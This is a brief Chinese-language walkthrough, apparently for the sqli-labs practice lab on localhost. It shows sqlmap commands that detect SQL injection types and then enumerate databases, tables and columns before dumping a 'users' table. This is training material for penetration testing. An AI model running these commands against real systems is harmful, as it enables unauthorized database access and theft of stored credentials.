1.首先检测可行注入方式
python sqlmap.py -u [http://localhost:8089/Less-1/?id=1](http://localhost:8089/Less-1/?id=1) ,然后这里它给出几种可行的注入方式 
比如布尔盲注，报错注入，联合注入 ，这里以联合注入为例子，检测可行注入后就去爆数据库名

```python
python sqlmap.py -u "http://localhost:8089/Less-1/?id=1" --dbs --batch自动化默认提示
python sqlmap.py -u "http://localhost:8089/Less-1/?id=1" -D security --tables
python sqlmap.py -u "http://localhost:8089/Less-1/?id=1" -D security -T users --columns
python sqlmap.py -u "http://localhost:8089/Less-1/?id=1" -D security -T users --dump

```
数据库名->表名->字段名->字段值
